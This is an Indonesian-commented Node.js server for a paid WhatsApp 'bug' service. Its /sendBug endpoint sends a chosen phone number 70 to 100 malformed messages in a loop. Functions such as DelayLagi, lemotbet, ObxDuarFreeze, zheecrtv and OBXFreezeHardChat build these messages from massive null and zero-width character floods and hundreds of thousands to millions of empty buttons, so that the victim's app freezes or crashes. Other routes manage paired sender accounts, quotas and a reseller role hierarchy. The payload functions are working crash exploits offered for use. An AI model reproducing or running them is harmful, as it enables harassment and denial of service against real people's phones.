function getGlobalSenderLimitMessage(role = "member", quota = {}) {
  const limit = quota.limit ?? getGlobalSenderDailyLimit(role);
  const used = quota.used ?? 0;
  return `Limit Global Sender untuk role ${String(role).toUpperCase()} sudah habis (${used}/${limit}).`;
}

function consumeGlobalSenderQuota(user) {
  const quota = getGlobalSenderQuotaPayload(user);

  if (!quota.canUse) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderDeniedMessage(quota.role),
    };
  }

  if (!quota.unlimited && quota.used >= quota.limit) {
    return {
      ok: false,
      changed: false,
      quota,
      message: getGlobalSenderLimitMessage(quota.role, quota),
    };
  }

  if (!quota.unlimited) {
    user.globalSenderUsage.count = quota.used + 1;
  }

  return {
    ok: true,
    changed: !quota.unlimited,
    quota: getGlobalSenderQuotaPayload(user),
  };
}

function buildSessionCacheKey(folderNameOrPath = "", sessionName = "") {
  const folderName = path.basename(String(folderNameOrPath).replace(/[\\/]+$/, "")) || String(folderNameOrPath);
  return `${folderName}::${sessionName}`;
}

function buildSenderConnectionItem(sender, scope, role) {
  const sessionName = sender?.sessionName?.toString() || sender?.id?.toString() || "Unknown";
  const isGlobal = scope === "global";

  return {
    id: sender?.id?.toString() || sessionName,
    sessionName,
    scope,
    isGlobal,
    canDelete: isGlobal ? canManageGlobalSender(role) : true,
  };
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = String(req.query.senderType || "private").trim().toLowerCase() === "global"
    ? "global"
    : "private";
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - Sender: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  let shouldSaveDatabase = ensureGlobalSenderUsageState(user);
  let globalSenderQuota = getGlobalSenderQuotaPayload(user);
  let selectedSession = null;

  if (senderType === "global") {
    if (!globalSenderQuota.canUse) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderDeniedMessage(user.role || "member"),
        globalSenderQuota,
      });
    }

    if (!globalSenderQuota.unlimited && globalSenderQuota.used >= globalSenderQuota.limit) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: getGlobalSenderLimitMessage(user.role || "member", globalSenderQuota),
        globalSenderQuota,
      });
    }

    selectedSession = checkActiveSessionInFolder(GLOBAL_SENDER_FOLDER);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada Global Sender aktif saat ini.",
        globalSenderQuota,
      });
    }
  } else {
    selectedSession = checkActiveSessionInFolder(user.username);
    if (!selectedSession) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: "Tidak ada sender pribadi aktif pada akun ini.",
        globalSenderQuota,
      });
    }
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 0,
    vip: 0,
    reseller: 0,
    pt: 0,
    moderator: 0,
    tk: 0,
    owner: 0,
    highadmin: 0,
    developer: 0,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 0;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    if (shouldSaveDatabase) {
      saveDatabase(db);
    }
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      senderType,
      globalSenderQuota,
    });
  }

  if (senderType === "global") {
    const quotaResult = consumeGlobalSenderQuota(user);
    globalSenderQuota = quotaResult.quota;

    if (!quotaResult.ok) {
      if (shouldSaveDatabase) {
        saveDatabase(db);
      }

      return res.json({
        valid: true,
        sended: false,
        senderType,
        message: quotaResult.message,
        globalSenderQuota,
      });
    }

    shouldSaveDatabase = shouldSaveDatabase || quotaResult.changed;
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType,
    senderSession: selectedSession.sessionName,
    globalSenderQuota,
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const activeFolder = senderType === "global" ? GLOBAL_SENDER_FOLDER : user.username;
    const attemptSend = async (session, retry = false) => {
      try {
        const sock = session?.sock;
        if (!sock) {
          throw new Error("Sender session not available");
        }

        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "delay":
            for (let i = 0; i < 100; i++) {
              await VonixBlankClick(sock, targetJid);
              await sleep(500);
            }
            break;
          case "android":
            for (let i = 0; i < 100; i++) {
              await ObxDuarFreeze(sock, targetJid);
              await sleep(500);
            }
            break;
          case "invisible":
            for (let i = 0; i < 100; i++) {
              await Delayinvis(sock, targetJid);
              await sleep(800);
            }
            break;
          case "iosvisible":
            for (let i = 0; i < 100; i++) {
              await lemotbet(sock, targetJid);
              await sleep(500);
            }
            break;
         case "forclose":
            for (let i = 0; i < 100; i++) {
              await DelayLagi(sock, targetJid);
              await sleep(500);
            }
            break;
          case "ui_kill":
    for (let i = 0; i < 100; i++) {
       await zheecrtv(sock, targetJid);
        await sleep(500)
    }
    break;
          case "crashvideo":
          for (let i = 0; i < 70; i++) {
          await OBXFreezeHardChat(sock, targetJid)
          await sleep(2000)
          
          }
          break;
                        }
          
        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (session?.cacheKey && err.message === 'Connection Closed') {
          delete activeConnections[session.cacheKey];
          delete biz[session.cacheKey];
          delete mess[session.cacheKey];
        }
        if (!retry) {
          const retrySession = await checkActiveSessionInFolder(activeFolder);
          if (retrySession) return await attemptSend(retrySession, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    if (!selectedSession?.sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(selectedSession);
  });
});
// ================= FUNCTION DISINI
async function DelayLagi(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          title: "\u0000",
          body: {
            text: "\uFDFD"
          },
          nativeFlowMessage: {
            buttons: "{".repeat(30000) + "}".repeat(20000)
          }
        }
      },
      participant: target
    }
  }, {});
}
                
async function lemotbet(sock, target) {
  const bytes = [
    [0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02],
    [0x9A, 0x03], [0xE2, 0x05], [0xC2, 0x06],
    [0x8A, 0x07], [0xF2, 0x08], [0xCA, 0x09],
    [0xB2, 0x0A], [0xDA, 0x0B], [0xA2, 0x0C]
  ];
  const flat = bytes.flat();
  const sidecar = Buffer.from(flat).toString("base64");
  const lengths = bytes.map(b => b[0] + b[1]);

  const msg = {
    interactiveMessage: {
      header: {
        title: "ꦽ".repeat(40000),
        hasMediaAttachment: false
      },
      body: { text: "ꦽ".repeat(120000) },
      footer: { text: "ꦽ".repeat(80000) },
      nativeFlowMessage: {
        buttons: Array.from({ length: 6667 }, () => ({}))
      },
      contextInfo: {
        userJid: target,
        mentionedJid: [target],
        isForwarded: true,
        forwardingScore: 999,
        expiration: 999999,
        scansSidecar: sidecar,
        scanLengths: lengths
      }
    }
  };
  await sock.relayMessage(target, msg, {});
  participant: true
}

async function Delayinvis(sock, target) {
    const FxT = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Cyber Ghost" + "\0".repeat(20000),
                        format: "FOUR"
                    },
                    nativeFlowMessage: {
                        name: "cta_call",
                        name: "voice_call",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            richResponseMessage: {}
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, FxT, { noSelfSync: true });
}

async function VonixBlankClick(sock, target) {
  try {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
    
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "VONIX CROSS" + "\u200b".repeat(20000) + "\u800b".repeat(20000) + "\x20".repeat(20000) + "\u0000".repeat(20000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "voice_call",
                  buttonParamsJson: "\0"
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦾ".repeat(30000) + "\uD808\uDC00".repeat(5000),
                    id: "\u600b".repeat(5000) + "\u0000".repeat(5000)
                  })
                }
              ]
            }
          }
        }
      }
    };

    for (let i = 0; i < 25; i++) {
      let msg;
      try {
        msg = await generateWAMessageFromContent(jid, payload, { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id + "_" + i });
      } catch {
        await sock.relayMessage(jid, payload, {});
      }
      await new Promise(r => setTimeout(r, 300));
    }
    
    console.log("✅ VONIX BLANK CLICK — Selesai terkirim ke:", jid);
  } catch (e) {
    console.error("❌ Error:", e.message);
  }
}

async function ObxDuarFreeze(sock, target) {
const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "[][]"
          },
          body: {
            text: "Reymon Bzirr"
          },
          nativeFlowMessage: {
                buttons: [
                  "628984627909@s.whatsapp.net" + "6285655555555@s.whatsapp.net" +
        "6289876543210@s.whatsapp.net" +
        "6281111111111@s.whatsapp.net",
                  ...Array.from({ length: 5555550 })
                ],
                name: "\0"
              },
              nativeFlowMessage: {
                name: "address_message",
                buttons: "\0".repeat(250000) + "\0".repeat(250000) + "quickly_replay".repeat(50000)
              }
        }
      }
    }
  }

const msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              fileSha256: "mnm9afzvi752rKOhEqgJuoXGvAavp+/7B39edCSjs0M=",
              fileLength: "205830",
              height: 1254,
              width: 1254,
              mediaKey: "7TV3Nv0ZSIL0xILkNwiC2k09qsld0W1NCuvmyL8eT/o=",
              fileEncSha256: "G7zTiKFse8lAASW5UUcF3RlXGPEs5EDoymJgxLl4OsY=",
              directPath: "/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1783478072",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAADAQEBAQAAAAAAAAAAAAAAAwQBAgUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADXc0Gds7E47ojVakjGgyhVJrDzxlnzHqnoJoUSnYYxNJ143uwnndR+0U61QgwE0xPLe5WCLVALEmCQQ0BzANwBagFAH//EACYQAAMAAQQBAwQDAAAAAAAAAAABAhEDBBIhFBAxQSIjQlFSYWL/2gAIAQEAAT8AUikmRScBwORoqSZJQpFI2lSn5ZgclSVJCJQ2pWX6O15sw/4GBopFIhEoRvN29pUvpp+6HutV7tbrg+CNtu/Lp/jK9KKIG7lNrv8ASPudNe2OzcPbY1OUNX/Yr01pxx6nPZpvaXHzzz1g0lqykqxgvPwWQyWI19r5V/X1MlbGvLWhyamlhsltbzpvKY2UUyGSxMyXpZ3unqf5Mj6rOSmUyWTRNCo5DodFUVRNComzmcx2VY6HR//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA"
              },
              scansSidecar: "gZPLDkqPqc67rjEO2tfcJ9zsSpwJtyEDblK/EUAsgXewUvWmHVgw5Q==",
              scanLengths: [11276, 34736, 50604, 109214],
              midQualityFileSha256: "sIRX95Bfzqy24VGF60QOGVeh7m1aIg5aphYxlT0UlPk="
            }
          },
          body: {
            text: "\0".repeat(50000) + "{}".repeat(30000)
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(10000) + "[]".repeat(20000)
          }
        }
      }
    }
  };
  
  const msg3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "[]".repeat(50000) + "{}".repeat(40000),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [target],
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }
    }
  };
    
await sock.relayMessage(target, msg, {});
await sock.relayMessage(target, msg2, {});
await sock.relayMessage(target, msg3, {});
}
    
async function zheecrtv(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0070".repeat(50000),
              subtitle: "\u0070".repeat(50000),
              deck: {
                uuid: "\u0070".repeat(50000),
                data: "\u0070".repeat(50000),
                type: "\u0070".repeat(50000),
                fallback: "\u0070".repeat(50000),
                accessibilityText:  "\u0070".repeat(50000),
                  badge: {
                    text:  "\u0070".repeat(50000),
                    color:  "\u0070".repeat(50000)
                  },
                animations: {
                    enter:  "\u0070".repeat(50000)
                  },                
                 children: [
                  {
                    uuid: "\u0070".repeat(50000),
                    type:  "\u0080".repeat(50000),
                    data:  "\u0000".repeat(50000)
                    }
                 ] 
              }
            },
            body: { text: "\x10".repeat(50000), },
            nativeFlowMessage: {
              buttons: "[".repeat(50000)
            }
          }
        }
      }
    };

    for (let i = 0; i < 100; i++) {
      try {
        await sock.relayMessage(target, msg, { participant: true } );
        console.log(" ok(" + (i + 1) + ")");
      } catch (e) {
        console.log(" err: " + e.message);
      }
    }

    console.log("✅ Success: " + target);
  } catch (err) {
    console.error("❌ Error: " + err.message);
  }
}

async function OBXFreezeHardChat(sock, target) {
    const ReymonOneMsg1 = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "꧀"
                    },
                    nativeFlowMessage: {
                        buttons: "\n".repeat(250000) + "\0".repeat(250000)
                    }
                }
            }
        }
    };

    const ReymonOneMsg2 = {
        interactiveMessage: {
            body: {
                text: "\u200B" + "\n".repeat(25000)
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                nativeFlowResponsMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        }
    };

    await sock.relayMessage(target, ReymonOneMsg1, { noSelfSync: true });
    await sock.relayMessage(target, ReymonOneMsg2, { noSelfSync: true });
}

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    if (activeConnections[cacheKey]) {
      activeCreds.push({
          id: sessionName,
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

function removeSessionArtifacts(folderPath, sessionName) {
  const sessionFolder = path.join(folderPath, sessionName);
  const sessionFile = path.join(folderPath, `${sessionName}.json`);

  if (fs.existsSync(sessionFolder)) {
    fs.rmSync(sessionFolder, { recursive: true, force: true });
  }

  if (fs.existsSync(sessionFile)) {
    fs.rmSync(sessionFile, { force: true });
  }
}

const deletingSessions = new Set();

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const changed = ensureGlobalSenderUsageState(user);
  const privateConnections = getActiveCredsInFolder(user.username).map(sender =>
    buildSenderConnectionItem(sender, "private", user.role || "member")
  );
  const globalConnections = getActiveCredsInFolder(GLOBAL_SENDER_FOLDER).map(sender =>
    buildSenderConnectionItem(sender, "global", user.role || "member")
  );

  if (changed) {
    saveDatabase(db);
  }

  return res.json({
    valid: true,
    connections: [...globalConnections, ...privateConnections],
    privateConnections,
    globalConnections,
    globalSenderQuota: getGlobalSenderQuotaPayload(user),
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number, global } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "Invalid session key" });

  const cleanNumber = String(number || "").replace(/\D/g, "");
  const isGlobal = String(global || "0").trim() === "1";
  if (!cleanNumber) return res.status(400).json({ error: "Number is required" });

  if (isGlobal && !canManageGlobalSender(user.role || "member")) {
    return res.status(403).json({
      valid: false,
      message: "Hanya owner atau developer yang dapat menambahkan Global Sender.",
    });
  }

  try {
  const ownerFolder = isGlobal ? GLOBAL_SENDER_FOLDER : user.username;
  const cacheKey = buildSessionCacheKey(ownerFolder, cleanNumber);
  const sessionDir = path.join('permenmd', ownerFolder, cleanNumber); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(`permenmd/${ownerFolder}`)) fs.mkdirSync(`permenmd/${ownerFolder}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('permenmd', ownerFolder), cleanNumber);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${cleanNumber}...`);
        await waiting(3000);
        await pairingWa(cleanNumber, ownerFolder);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;

      const sourceCreds = path.join(sessionDir, "creds.json");
      const destCreds = path.join("permenmd", ownerFolder, `${cleanNumber}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(cleanNumber);
    console.log(code)
    if (code) {
      return res.json({
        valid: true,
        number: cleanNumber,
        pairingCode: code,
        scope: isGlobal ? "global" : "private",
      });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  return res.json({
    valid: false,
    message: "Sender sudah terhubung atau pairing masih diproses.",
  });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.delete("/deleteSender", async (req, res) => {
  const { key, id, scope } = req.query;
  const keyInfo = resolveKeyInfo(key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "User not found" });

  const senderId = String(id || "").trim();
  if (!senderId) {
    return res.status(400).json({ valid: false, message: "Sender id is required" });
  }

  const requestedScope = String(scope || "").trim().toLowerCase();
  const userFolderName = user.username;
  const globalFolderName = GLOBAL_SENDER_FOLDER;

  let resolvedFolderName = userFolderName;
  let resolvedScope = "private";

  if (requestedScope === "global") {
    if (!canManageGlobalSender(user.role || "member")) {
      return res.status(403).json({
        valid: false,
        message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
      });
    }

    resolvedFolderName = globalFolderName;
    resolvedScope = "global";
  } else {
    const privateFile = path.join('permenmd', userFolderName, `${senderId}.json`);
    const privateDir = path.join('permenmd', userFolderName, senderId);
    const globalFile = path.join('permenmd', globalFolderName, `${senderId}.json`);
    const globalDir = path.join('permenmd', globalFolderName, senderId);
    const privateExists = fs.existsSync(privateFile) || fs.existsSync(privateDir);
    const globalExists = fs.existsSync(globalFile) || fs.existsSync(globalDir);

    if (!privateExists && globalExists) {
      if (!canManageGlobalSender(user.role || "member")) {
        return res.status(403).json({
          valid: false,
          message: "Hanya owner atau developer yang dapat menghapus Global Sender.",
        });
      }

      resolvedFolderName = globalFolderName;
      resolvedScope = "global";
    }
  }

  const resolvedFolder = path.join('permenmd', resolvedFolderName);
  const sessionFolder = path.join(resolvedFolder, senderId);
  const sessionFile = path.join(resolvedFolder, `${senderId}.json`);
  const cacheKey = buildSessionCacheKey(resolvedFolderName, senderId);
  const sock = activeConnections[cacheKey] || biz[cacheKey] || mess[cacheKey];

  if (!sock && !fs.existsSync(sessionFolder) && !fs.existsSync(sessionFile)) {
    return res.status(404).json({ valid: false, message: "Sender not found" });
  }

  deletingSessions.add(cacheKey);

  delete activeConnections[cacheKey];
  delete biz[cacheKey];
  delete mess[cacheKey];

  if (sock?.logout) {
    try {
      await sock.logout();
    } catch (err) {
      console.log(`[${senderId}] Logout during delete failed: ${err.message}`);
    }
  }

  removeSessionArtifacts(resolvedFolder, senderId);

  if (!sock) {
    deletingSessions.delete(cacheKey);
  }

  return res.json({
    valid: true,
    deleted: true,
    id: senderId,
    scope: resolvedScope,
  });
});


const normalizeRoleName = (role = "member") =>
  String(role).trim().toLowerCase().replace(/\s+/g, "_");

const ROLE_CREATE_PERMISSIONS = {
  developer: ["highadmin", "owner", "developer", "tk", "pt", "moderator", "reseller", "vip", "member"],
  highadmin: ["owner", "developer", "tk", "pt", "moderator", "reseller", "vip", "member"],
  owner: ["tk", "pt", "moderator", "reseller", "vip", "member"],
  tk: ["pt", "moderator", "reseller", "vip", "member"],
  moderator: ["pt", "reseller", "vip", "member"],
  pt: ["reseller", "vip", "member"],
  reseller: ["vip", "member"],
  vip: ["member"],
  member: [],
};

function getAllowedCreateRoles(role) {
  return ROLE_CREATE_PERMISSIONS[normalizeRoleName(role)] || [];
}

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role = "member" } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}' role '${role}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin membuat role '${role}'.`);
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (creatorRole === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: requestedRole,
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day} role ${requestedRole}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (owner/developer only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  const adminRole = normalizeRoleName(admin?.role || "member");
  if (!admin || !["owner", "developer"].includes(adminRole)) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner/developer.`);
    return res.json({ valid: true, authorized: false, message: "Only owner or developer can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
    
    sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
    
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const viewer = db.find(u => u.username === keyInfo.username);
  const viewerRole = normalizeRoleName(viewer?.role || "member");
  const allowedRoles = getAllowedCreateRoles(viewerRole);

  if (!viewer || allowedRoles.length === 0) {
    console.log(`[❌ LIST] ${viewer?.username || "Unknown"} tidak diizinkan melihat user list.`);
    return res.json({
      valid: true,
      authorized: false,
